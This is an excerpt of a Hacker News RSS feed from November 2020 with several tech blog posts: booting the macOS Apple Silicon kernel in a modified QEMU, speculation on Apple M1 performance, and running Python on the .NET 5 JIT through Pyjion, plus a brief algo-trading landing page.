<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/e47219f7aa-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>7</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064721</guid>
            <pubDate>Thu, 12 Nov 2020 00:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Booting a macOS Apple Silicon Kernel in QEMU]]>
            </title>
            <description>
<![CDATA[
Score 254 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25064593">thread link</a>) | @empyrical
<br/>
November 11, 2020 | https://worthdoingbadly.com/xnuqemu3/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/xnuqemu3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I booted the arm64e kernel of macOS 11.0.1 beta 1 kernel in QEMU up to launchd. It’s completely useless, but may be interesting if you’re wondering how an Apple Silicon Mac will boot.</p>

<h2 id="howto">Howto</h2>

<p>This is similar to my previous guide on running <a href="https://worthdoingbadly.com/xnuqemu2/">iOS kernel in QEMU</a>:</p>

<ul>
  <li>install macOS 11.0.1 beta 1 (20B5012D)</li>
  <li>run <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh"><code>build_arm64e_kcache.sh</code></a> to create an Apple Silicon Boot Kext Collection</li>
  <li>build the modified QEMU:
    <div><div><pre><code>git clone https://github.com/zhuowei/qemu
cd qemu
git checkout a12z-macos
mkdir build
cd build
../configure --target-list=aarch64-softmmu
make
</code></pre></div>    </div>
  </li>
  <li>create a modified device tree by running <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">DTRewriter</a> on <a href="https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-30235/6D8C0CA3-5952-4FD8-AEB3-4B4CADB626BC/iPad8,11,iPad8,12_14.0_18A5332f_Restore.ipsw">iPad Pro firmware</a>:
    <div><div><pre><code>python3 extractfilefromim4p.py Firmware/all_flash/DeviceTree.j421ap.im4p DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree
java DTRewriter DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb
</code></pre></div>    </div>
  </li>
  <li>run QEMU:
    <div><div><pre><code>./aarch64-softmmu/qemu-system-aarch64 -M virt -cpu max \
  -kernel /path/to/bootcache-arm64e \
  -dtb /path/to/DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb  \
  -monitor stdio -m 6G -s -S -d unimp,mmu \
  -serial file:/dev/stdout -serial file:/dev/stdout -serial file:/dev/stdout \
  -append "-noprogress cs_enforcement_disable=1 amfi_get_out_of_my_way=1 nvram-log=1 debug=0x8 kextlog=0xffff io=0xfff serial=0x7 cpus=1 rd=md0 apcie=0xffffffff" \
  -initrd /path/to/ios14.0b3/ramdisk.dmg $@
</code></pre></div>    </div>
  </li>
  <li>run gdb with <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/bootit.gdbscript">this script</a>:
    <div><div><pre><code>~/Library/Android/sdk/ndk/21.0.6113669/prebuilt/darwin-x86_64/bin/gdb \
-D /any/emptydir \
-x bootit.gdbscript
</code></pre></div>    </div>
    
  </li>
</ul>

<p>And the macOS kernel will <a href="https://gist.github.com/zhuowei/5aa668e76f387374cd56848313aa2197">boot into launchd</a>.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p><img src="https://worthdoingbadly.com/assets/blog/xnuqemu3/wwdc2018_no.jpg" alt="&quot;No.&quot; - Craig Federighi, WWDC 2018"></p>

<p>No:</p>

<ul>
  <li>Absolutely nothing is supported: literally only the kernel and the serial port works, not even the userspace since there’s no disk driver</li>
  <li>Userspace is instead borrowed from iOS 14 b3</li>
  <li>This will never boot anything close to graphical macOS UI</li>
  <li>Most importantly, even if I ever managed to fully boot the macOS kernel, emulating macOS is useless anyways.</li>
</ul>

<p>There are only three reasons I can think of for emulating macOS: security research, software development without a real Apple Silicon machine, and Hackintoshing. This approach will help with none of these:</p>

<ul>
  <li>Emulating iOS is useful for security research when jailbreak is not available. Apple Silicon Macs already support kernel debugging.</li>
  <li>Not useful for software dev: QEMU’s CPU emulation doesn’t support Apple Silicon-specific features, such as Rosetta’s memory ordering or the APRR JIT.</li>
  <li>as for Hackintosh: macOS uses CPU instructions that aren’t available yet on non-Apple ARM CPUs, so you can’t have hardware accelerated virtualization, only very slow emulation. Besides, Hackintoshes are often built when Apple’s own hardware isn’t fast enough; in this case, Apple’s ARM processors are already some of the fastest in the industry.</li>
</ul>

<p>I researched this this not because it’ll be practical, but only to understand how an Apple Silicon Mac works. This will never be a <a href="https://www.youtube.com/watch?v=1AtE54HpXBM">Time Train</a>: only a <a href="https://youtu.be/UswpJh6Zvd8?t=119">science experiment</a>.</p>

<h2 id="what-i-did">What I did</h2>

<h2 id="create-kext-collection">Create kext collection</h2>

<p>On iOS, the kernel and its Kexts are packed together into a bootable file called the <strong>Kernel Cache</strong>.</p>

<p>macOS 11 uses an evolved version of this format, called the <strong>Boot Kext Collection</strong>.</p>

<p>Like the iOS kernelcache, it contains all Kexts required for booting, so the bootloader only needs to load it into memory and jump into it.</p>

<p>To create a boot kext collection, macOS 11 introduces the <a href="https://developer.apple.com/documentation/kernel/installing_a_custom_kernel_extension?language=objc"><code>kmutil</code></a> tool.</p>

<p>Here’s <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh">my script</a> to get <code>kmutil</code> to generate an arm64e kext collection.</p>

<p>It manually excludes some kexts because they cause kmutil to error out. Most are because they depend on ACPI, which is not available on Apple Silicon. I made a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/printexcludekexts.sh">script</a> to detect them.</p>

<p>Debugging <code>kmutil</code> failures on macOS 11 beta 3 was easy because it dumped out the entire NSError message. However, on macOS 11.0.1 beta, Apple decided to hide the full error message and only print an error code. I had to disable SIP and put a breakpoint on <code>swift_errorRetain</code> to get at the underlying error.</p>

<p>Once the <code>build_arm64e_kcache.sh</code> runs, a Boot Kext Collection is created at <code>~/kcache_out/bootcache-arm64e</code>, which can be booted in QEMU.</p>

<h2 id="disassembling-the-boot-kext-collection">Disassembling the boot kext collection</h2>

<p>For debugging, I also had to disassemble the newly created Boot Kext Collection in Ghidra.</p>

<p>Unfortunately, Ghidra isn’t updated for macOS 11 and will refuse to load the file, first giving an error about XML DOCTYPE, then - once that’s worked around - an <a href="https://github.com/NationalSecurityAgency/ghidra/issues/2192">IOException</a> from the invalid <code>ntools</code> value in the <code>LC_BUILD_VERSION</code> load command.</p>

<p>I created a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/patch_boot_kext_collection_for_ghidra.py">script</a> to fix up the kext collection so that Ghidra can load it.</p>

<p>Note that this is still not perfect - Ghidra still doesn’t fixup pointers or read symbols.</p>

<p>To get method names, I also disassembled the raw kernel file (<code>/System/Library/Kernels/kernel.release.t8020</code>) for cross reference. Note that the raw kernel is based at a different address - you can either rebase it in Ghidra, or just be careful to convert addresses.</p>

<h2 id="disable-pac">Disable PAC</h2>

<p>I already had a <a href="https://worthdoingbadly.com/xnuqemu2/">modified QEMU to boot an iOS kernel</a> (which has inspired others, such as <a href="https://alephsecurity.com/">Aleph Security</a>, to build much better open-source iOS emulation platforms)</p>

<p>In early 2019 I updated my modified QEMU to work with PAC for the iPhone Xs/Xr.</p>

<p>QEMU by that time already supported PAC instructions; however, Apple <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">modified</a> the crypto algorithm when implementing PAC, so the kernel fails to boot.</p>

<p>I decided to instead <a href="https://github.com/zhuowei/qemu/commit/16613b67ad15a902791109077ebfb1091f1873aa">turn PAC instructions</a> into no-ops, since I don’t know how Apple’s algorithm worked. This also makes it easier to debug the kernel.</p>

<p>Since the macOS DTK used an A12z processor, the modified QEMU just worked.</p>

<h2 id="device-tree">Device tree</h2>

<p>Like iOS, macOS on Apple Silicon uses a <strong>device tree</strong> to describe hardware to the kernel, and to pass boot arguments.</p>

<p>macOS 11.0.1 beta’s installer doesn’t contain a device tree for the DTK: I suspect it would be in the .ipsw files, which are not publically available. Instead, I borrowed the iPad Pro’s device tree from iOS 14 beta 3.</p>

<p>Like the <a href="https://worthdoingbadly.com/xnuqemu2/">iOS in QEMU experiments</a>, I first disabled every piece of hardware in the device tree except the serial port.</p>

<p>Unlike iOS, macOS expects some more information in the device tree:</p>
<ul>
  <li>ram size (since Macs have upgradeable RAM)</li>
  <li>nvram, otherwise panics with a null pointer while reading nonce-seed. (I copied nvram from <a href="https://gist.github.com/bazad/1faef1a6fe396b820a43170b43e38be1">bazad’s dump of an iPhone device tree</a>.)</li>
  <li>AMCC (KTRR) register positions</li>
  <li>System Integrity Protection status</li>
</ul>

<p>I rewrote my <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">device tree editor</a> to allow populating these extra params.</p>

<h2 id="up-to-launchd">Up to launchd</h2>

<p>I can’t actually boot a macOS root filesystem as I don’t have an emulated hard disk.</p>

<p>I don’t have a recovery ramdisk either: that would likely only be included in the DTK IPSW, which is not public.</p>

<p>Instead, I decided to boot with an iOS ramdisk to test the kernel, and disable signature checking using a GDB breakpoint.</p>

<p>I also couldn’t get the trustcache (list of executables trusted by the kernel) to load. I tried following <a href="https://alephsecurity.com/2019/06/25/xnu-qemu-arm64-2/">Aleph Security’s guide</a>, but macOS 11 is more strict than iOS 12 and needs it below the kernel; I couldn’t figure out the correct memory address.</p>

<h2 id="why-it-took-so-long">Why it took so long</h2>

<p>I actually had this blog post ready since <a href="https://gist.github.com/zhuowei/27816d39f234468cf2956479c0dea7ad">August 9th</a>, but I spent an extra 3 months trying to fix issues, since I really wanted to at least get to a shell!</p>

<p>Unfortunately:</p>
<ul>
  <li>debugging why drivers wasn’t loading was hard</li>
  <li>I couldn’t disable signature checking properly</li>
  <li>I wanted to wait until Apple released an A14 kernel instead of the DTK’s A12, so that we can look at how virtualization works, but they never did</li>
</ul>

<p>It’s now November 9th and Apple’s holding their press conference tomorrow: so it’s <a href="https://www.youtube.com/watch?v=9tAbhrDUrqM">now or never</a>.</p>

<h2 id="whats-left">What’s left</h2>

<p>I’m probably not going to be working further on this, but here’s what one can do to make this an actual useful research platform:</p>

<ul>
  <li>Figure out why half the drivers aren’t loading at all</li>
  <li>Write basic drivers/emulations:
    <ul>
      <li>probably emulate AIC in QEMU (based on Project Sandcastle’s Linux driver) since a custom interrupt controller Kext would be hard to write</li>
      <li>port Apple’s old <a href="https://opensource.apple.com/source/AppleMacRiscPCI/AppleMacRiscPCI-3.4/AppleMacRiscPCI.cpp.auto.html">PowerPC PCIE</a> drivers, since it’s too hard to emulate the Apple Silicon PCIE controller. This will allow us to connect a virtual hard drive.</li>
    </ul>
  </li>
  <li>Switch to the A14 kernel when Apple releases Apple Silicon Macs, so we can test virtualization</li>
</ul>

<h2 id="what-i-learned">What I learned</h2>

<ul>
  <li>How to modify QEMU to disable PAC</li>
  <li>How iBoot on Apple Silicon passes boot options in the device tree</li>
  <li>How to generate an Apple Silicon kernel cache without an Apple Silicon Mac</li>
  <li>How to fight <code>kmutil</code> for the real error message</li>
  <li>Never procrastinate on a blog post for three months</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>]]>
            </description>
            <link>https://worthdoingbadly.com/xnuqemu3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064593</guid>
            <pubDate>Thu, 12 Nov 2020 00:09:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overlooked source of Apple M1 performance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064570">thread link</a>) | @kwiromeo
<br/>
November 11, 2020 | https://kwiromeo.com/explaining-apple-m1-products-performance/ | <a href="https://web.archive.org/web/*/https://kwiromeo.com/explaining-apple-m1-products-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>When watching <a href="https://youtu.be/5AwdkGKmZ0I">Apple's Arm laptops</a> event, I couldn't help but wonder: where is all that performance coming from? During the event, there were two key points (that are not obvious, IMHO), that further explain where they are getting all that extra performance from.</p><p>But first, let's mention the obvious stuff, that plenty of analysts will anchor on, and that are valid:</p><ul><li><strong>More transistors is better</strong>: 5nm process allows more transistors in a chip. More transistors = more instructions processed = faster performance</li><li><strong>Small means low power consumption:</strong> 5nm process allows for lower power consumption. This is because, at that size, the transistor can operate between 0.7V - 1.2V per transistor[<a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">1</a>] (instead of 1V - 1.35V)[<a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">2</a>]. At the numbers of billions of transistors, a small voltage difference means a lot for battery consumption.</li><li><strong>Specialized hardware gives an edge</strong>: Accelerators (like the neural engine) allow the Mac to offload specific tasks to another core, which leaves the main processor, M1 to do the work that is less specific (like compiling your code from XCode 😉 )</li></ul><h2 id="unified-memory-architecture-or-making-friends-with-physics-">Unified Memory Architecture (or Making Friends with Physics)</h2><p>When I was transitions careers to become a software developer, I came across this post about latency numbers of common computer components ( a link at <a href="http://norvig.com/21-days.html#answers">Peter Norvig post about it</a>), it occurred to me that all these numbers were proportional to the distance between the CPU and the location of the data. The further the electrons need to travel, the more time they will take. This is a massive oversimplification but illustrates the point well. There are other details to take into account as well. &nbsp;The one that comes to mind is that having the electrical signal only traveling though the SoC instead of the printed circuit board, avoid a lot of signal conditioning that would need to happen to keep signal integrity. Apple brought all their chips closer, which reduced the amount of travel time for every critical signal, as well as reduced the number of medium transitions (from an integrated circuit to a printed circuit board, back to an integrated circuit) as shown in the figure below. This results in higher data access speed by the CPU and the GPU, which translates to a faster experience for the end-user.</p><figure><img src="https://kwiromeo.com/content/images/2020/11/apple_m1_soc_vs_logic_board.jpg" alt="sketch of a logic board with separate chips compared to an apple M1 SoC"><figcaption>Showing the reduced distance of signal traveling for a logic board vs. a SoC :-)&nbsp;</figcaption></figure><h2 id="avoid-unnecessary-copies-or-the-gospel-by-a-c-performance-engineer-">Avoid Unnecessary Copies (or the gospel by a C++ performance engineer)</h2><p>In my year of learning and using C++, I've learned that (unnecessary) copies are bad, and Craig Federighi also knows this. During the presentation, he says</p><blockquote>"We built macOS on Apple Silicon to use the same data formats for things like video decode, GPU and display, so there's no need for expensive copying or translation"</blockquote><p>Why are copies they bad? This has to do with what happens when an object is copied. Here's a simple way to look at the process. Whenever a program issues a copy command, then the CPU needs to:</p><ul><li>read the memory location of the data,</li><li>then reserve memory where the data will be copied</li><li>then copy the data</li><li>then decide what to do with the original data</li></ul><p>When the source of the data copied remains, then the CPU is done. However, when the source data needs to be deleted, then there's the additional step of de-allocating memory space so that other instructions can use it. This problem is sometimes caught by the compiler, whenever possible, and performs an optimization called <a href="https://en.wikipedia.org/wiki/Copy_elision">copy elision</a> whenever it is obvious that a copy is unnecessary. However, while <a href="https://youtu.be/bSkpMdDe4g4">compilers are awesome</a>, they can't undo a programmer's lack of optimization knowledge. One solution that the C++ community found useful, is that we can help the compiler by specifying when copies are not needed. Since C++ 14, programmers can also tell the compilers that we don't need to go through a deep copy, instead, use a command <code>std::move</code>, which does the magic of not destroying and recreate the same thing. This saves CPU cycles, and improves performance.</p><p>From the Apple M1 MacBook presentation, Apple makes the above behavior default: <strong>instead of having the programmer choose between copying or reusing data, reuse of the data is the default</strong>. This makes the efficient behavior to be the default, and save programs from being slowed down by unnecessary copies</p><h2 id="things-i-may-have-missed-and-things-i-don-t-know-about-">Things I May Have Missed (and Things I Don't Know About)</h2><p>The above is a simplified view of the programming model of Apple's new M1 chip. By not having programmed for one, the above is my best guess at how the items noted in the keynote mentions would translate in hardware and software. It's possible that Apple simplified the programming paradigm of CPU vs GPU programming by obfuscating calls to GPU instructions in the macOS APIs. If all the hardware is one the same chip, the programmer doesn't need to know what sub-chip (CPU, GPU, Neural Engine, etc...) is doing the job, but just that the chip (M1) is doing it. From there, the job is for compiler optimization to take over, and make the best decision as to which sub-chip needs to process the instruction.</p><p>—</p><p>PS: if someone who knows the nitty gritty details of this, hit me up <a href="https://twitter.com/kwiromeo">@kwiromeo</a> on twitter. I would love to learn more about this.</p><hr><p>[1] AnandTech - <a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">Early TSMC 5nm Test Chip Yields 80%, HVM Coming in H1 2020</a></p><p>[2] AnandTech - <a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">What Products Use Intel 10nm? SuperFin and 10++ Demystified</a></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://kwiromeo.com/explaining-apple-m1-products-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064570</guid>
            <pubDate>Thu, 12 Nov 2020 00:06:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Python on .NET 5]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064143">thread link</a>) | @eatox
<br/>
November 11, 2020 | https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html | <a href="https://web.archive.org/web/*/https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
<li>3 builtin languages, C#, F# and VB.NET, each with its own compiler</li>
<li>A standard library</li>
<li>A common intermediate language to abstract the high level languages from the core runtime. This is a standard known as <a href="https://github.com/tonybaloney/ecma-335/tree/master/docs">ECMA 335 CIL</a>.</li>
<li>A common language runtime (CLR) that compiles CIL into native machine code so that it can be executed and packages executables into .exe formats.</li>
</ul>
<p><img alt=".NET architecture" src="https://tonybaloney.github.io/img/posts/Common_Language_Infrastructure.png"></p>
<p>.NET 5 CLR comes bundled with a performant JIT compiler (codenamed RyuJIT) that will compile .NETs CIL into native machine instructions on Intel x86, x86-64, and ARM CPU architectures.</p>
<p>You can write code in a number of languages, like C++, C#, F# and compile those into CIL and then into native machine code (as a binary executable) on macOS, Linux, and Windows. Pretty neat.</p>
<p>But this is a blog about Python. So what does this have to do with Python?</p>
<p>Pyjion is a project to replace the core execution loop of CPython by transpiling CPython bytecode to ECMA CIL and then using the .NET 5 CLR to compile that into machine code. It then executes the machine-code compiled JIT frames at runtime instead of using the native execution loop of CPython.</p>
<h2>Very-quick overview of Python’s compiler</h2>
<p>When CPython compiles Python code, it compiles it into an intermediate format, similar to .NET, called Python bytecode. This bytecode is cached on disk so that when you import a module that hasn’t changed, it doesn’t compile it every time. You can see the bytecode by disassembling any Python function:</p>
<pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def half(x):
...    return x/2
... 
&gt;&gt;&gt; dis.dis(half)
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (2)
              4 BINARY_TRUE_DIVIDE
              6 RETURN_VALUE
</code></pre>

<p>To execute anything on a CPU, you have to provide the OS with machine-code instructions. This can be accomplished by compiling them up-front using a compiled like the C or C++ compilers. They compile code into executable formats as either shared libraries or standalone executables. <a href="https://tonybaloney.github.io/posts/extending-python-with-assembly.html"><em>See my post on Python/assembly for a bit more info on this topic</em></a>.</p>
<p>CPython converts the bytecode into machine code instructions like looping over them in a precompiled function, called the evaluation loop. This is essentially a big for loop with a switch statement. The compiled version of CPython that you’re running already has the instructions required. This is why CPython’s evaluation loop is an “AOT”, or “Ahead of Time” compiled library:</p>
<p><img alt="diagram 1" src="https://tonybaloney.github.io/img/posts/Slide1.png"></p>
<p><strong>Note: There is a lot more to CPython’s compiler. I’ve written a <a href="https://realpython.com/products/cpython-internals-book/">whole book on the CPython compiler and the internals of CPython</a> if you want to learn more.</strong></p>
<p>There are a few issues with this approach. The biggest is speed. A series of inline machine-code instructions is very performant. CPython has to make judgements at runtime for which code branch to follow every time your function is run. This leads to CPython being 100x slower in “tight-loop” problems where its executing the same thing again and again. The machine-code is compiled ahead of time and it has to loop around to get to the right instructions. Checkout my PyCon talk for a more in-depth explanation:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/I4nkgJdVZFA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The most common way around this performance barrier is to compile Python extensions from C. This produces a custom binary with inline machine-code instructions for the task at hand. This is how most machine-learning and data science libraries like numpy, pandas, SKL are put together. This approach is still AOT compiling the code. It also requires a lot of knowledge of C. This approach has worked really well for the data science community, where algorithms can be performant and leverage low-level platforms <a href="https://numba.pydata.org/numba-doc/latest/cuda/index.html">like GPUs or specialised AI chipsets</a>.</p>
<p>There are a few issues with the AOT extension module approach. One is that it still uses the evaluation loop. C extension modules are a set of functions. Once you call the C-compiled function, its in the performant code, but your Python code that’s calling it still lives inside Python’s loop. If you want to leverage a compiled library and your Python code is doing some heavy number crunching, you end up having to use an API of functions, like numpy, instead of a more fluent Python API:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.ones([9, 5, 7, 4])
&gt;&gt;&gt; c = np.ones([9, 5, 4, 3])
&gt;&gt;&gt; np.dot(a, c).shape
(9, 5, 7, 9, 5, 3)
&gt;&gt;&gt; np.matmul(a, c).shape
(9, 5, 7, 3)
</code></pre>

<h2>What Pyjion does to solve this issue</h2>
<p>A few releases of Python ago (CPython specifically, the most commonly used version of Python) in 3.7 a new API was added to be able to swap out “frame execution” with a replacement implementation. This is otherwise known as <a href="https://www.python.org/dev/peps/pep-0523/">PEP 523</a>. PEP 523 also added the capability to store additional attributes in <em>code objects</em> (compiled Python code.</p>
<p>Pyjion does not compile Python code. It compiles Python frames (code objects, like blocks, functions, methods, classes) into machine-code at runtime using a performant JIT:</p>
<p><img alt="diagram 2" src="https://tonybaloney.github.io/img/posts/Slide2.png"></p>
<p>CPython compiles the Python code, so whatever language features and behaviours there are in CPython 3.9, like the walrus operator, <a href="https://www.python.org/dev/peps/pep-0584">the dictionary union operator</a>, will all work exactly the same with this extension enabled. This also means that this extension uses the same standard library as Python 3.9.</p>
<p>Pyjion is a “pip installable” package for standard CPython that JIT compiles all Python code at runtime using the .NET 5 JIT compiler. You can use off-the-shelf CPython 3.9 on macOS, Linux or Windows. After installing this package you just import the module and enable the JIT.</p>
<p>Once a frame has been compiled, the binary code is cached in memory and reused every time the function is called:</p>
<p><img alt="diagram 3" src="https://tonybaloney.github.io/img/posts/Slide3.png"></p>
<h2>Using Pyjion</h2>
<p>To get started, you need to have .NET 5 installed, with Python 3.9 and the Pyjion package (I also recommend using a virtual environment).</p>
<p>After importing pyjion, enable it by calling <code>pyjion.enable()</code> which sets a compilation threshold to 0 (the code only needs to be run once to be compiled by the JIT):</p>
<pre><code>&gt;&gt;&gt; import pyjion
&gt;&gt;&gt; pyjion.enable()
</code></pre>

<p>Any Python code you define or import after enabling pyjion will be JIT compiled. You don’t need to execute functions in any special API, its completely transparent:</p>
<pre><code>&gt;&gt;&gt; def half(x):
...    return x/2
&gt;&gt;&gt; half(2)
1.0
</code></pre>

<p>Pyjion will have compiled the <code>half</code> function into machine code on-the-fly and stored a cached version of that compiled function inside the function object.
You can see some basic stats by running <code>pyjion.info(f)</code>, where <code>f</code> is the function object:</p>
<pre><code>&gt;&gt;&gt; pyjion.info(half)
{'failed': False, 'compiled': True, 'run_count': 1}
</code></pre>

<p>You can see the machine code for the compiled function by disassembling it in the Python REPL.
Pyjion has essentially compiled your small Python function into a small, standalone application.
Install <code>distorm3</code> first to disassemble x86-64 assembly and run <code>pyjion.dis.dis_native(f)</code>:</p>
<pre><code>&gt;&gt;&gt; import pyjion.dis
&gt;&gt;&gt; pyjion.dis.dis_native(half)
00000000: PUSH RBP
00000001: MOV RBP, RSP
00000004: PUSH R14
00000006: PUSH RBX
00000007: MOV RBX, RSI
0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The <a href="https://github.com/microsoft/Pyjion/pull/237">patch that I’m talking about</a> to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>
<li>Adding a disassembler (both machine-code and CIL) to aid development</li>
</ul>
<h2>Is this faster?</h2>
<p>The short answer a little, but not by much (yet).</p>
<p>JIT …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</a></em></p>]]>
            </description>
            <link>https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064143</guid>
            <pubDate>Wed, 11 Nov 2020 23:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Deploy professionally built algo-traders in 5 mins with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25063678">thread link</a>) | @tjs8rj
<br/>
November 11, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of users’ algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063678</guid>
            <pubDate>Wed, 11 Nov 2020 22:18:25 GMT</pubDate>
        </item>
        <item>
            <title>
